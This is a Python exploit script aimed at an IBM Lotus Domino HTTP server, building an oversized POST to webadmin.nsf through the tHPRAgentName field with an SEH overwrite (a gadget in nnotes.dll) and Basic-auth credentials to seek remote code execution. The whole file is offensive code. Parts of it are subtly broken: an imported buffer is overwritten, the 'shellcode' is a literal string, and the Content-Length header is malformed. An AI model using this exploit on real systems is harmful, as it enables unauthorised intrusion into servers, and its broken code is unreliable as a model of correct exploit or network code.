

#!/usr/bin/python

import socket
import sys
import socket
from payload import buf
import socket
import struct
def shell_attack(target_machine, target_port):

	host=target_machine					#server ip here!
	cookie="1234567890abcdef"	
	cookie = bytes(cookie, 'utf-8')                        #Set your Cookie credential here! Cookie = base64((usr:pwd))
	#Shellcode = Using XOR [reg],reg to crash ("like" INT3 :))
	Shellcode="chr(0x30)"
	Shellcode = bytes(Shellcode, 'utf-8') 
	server=host,target_port
	SEH=struct.pack(b"<L",0x60404672)                       # POP ESI - POP EBP - RETN nnotes.dll.60404672
	nSEH=struct.pack(b"<L",0x4141347A)                      # INC ecx  ;NOP 
															# INC ecx  ;NOP
								# JPE  slep ;Detour
	vars=b"__Click=0&tHPRAgentName="                         #tHPRAgentName => Vulnerable POST variable
	buf=b"A"*436                                             #sended buffer-nSEH-SEH
	slep=b"X"*46     
	buffer=vars+buf+SEH+nSEH+cookie+slep
	
	s=socket.socket()
	post=buildPOST(host,buffer,cookie)
	post = bytes(post, 'utf-8')
	#Trying connect to IBM Lotus Domino HTTP server
	try:
		s.connect(server)
	#We goin to exit if this fails
	except:
		print("[-] Error connecting to remote server...")
		sys.exit(0)
	
	#Crafting final POST
	
	#Sending Shellcode to remote server
	s.send(post)
	#Server is running? Some fails :S
	try:
		s.recv(2048)
		print("[x] Exploit failed!")
	#Else we achieve remote code execution successfully
	except:
		print("[+] Done!")
	s.close()                                        #pre-shellcode to fix JPE landing

#This function forges our POST request (with our Shellcode sure)
def buildPOST(h,b,c):				
	P="POST /webadmin.nsf/fmHttpPostRequest?OpenForm&Seq=1 HTTP/1.1\r\n"
	P+="Host: "+str(h)+"\r\n"
	P+="User-Agent: oh sure\r\n"
	P+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
	P+="Accept-Language: chinnese plz\r\n"
	P+="Accept-Encoding: gzip,deflate\r\n"
	P+="Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
	P+="Keep-Alive: 115\r\n"
	P+="Connection: keep-alive\r\n"
	P+="Referer:  http://"+str(h)+"/webadmin.nsf/dlgConfigPorts?ReadForm&objref=16\r\n"
	P+="Cookie: CWCweb=\"savedLocale:en\"\r\n"
	P+="Authorization: Basic "+str(c)+"\r\n"
	P+="Content-Type: application/x-www-form-urlencoded\r\n"
	P+="Content-Length: \r\n" + str(len(b))
	P+="\r\n"
	P+=str(b)
	return P

